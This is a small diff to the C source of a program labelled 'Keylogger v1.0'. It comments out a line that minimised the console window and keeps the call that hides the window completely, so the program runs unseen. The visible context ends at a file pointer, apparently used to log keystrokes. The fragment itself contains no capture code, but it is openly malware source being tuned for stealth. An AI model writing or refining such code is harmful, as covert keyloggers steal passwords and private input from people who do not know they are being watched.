@@ -1,4 +1,4 @@
-/* 
+/*
 Keylogger v1.0
 Author :- Arushit Mudgal */
 
@@ -15,7 +15,7 @@ int G(int a){
 int main()
 {
     HWND hwnd=GetConsoleWindow();
-    ShowWindow(hwnd,SW_MINIMIZE); //wont hide the window, minimise
+    //ShowWindow(hwnd,SW_MINIMIZE); //wont hide the window, minimise
     ShowWindow(hwnd,SW_HIDE);
 
     FILE *fp;
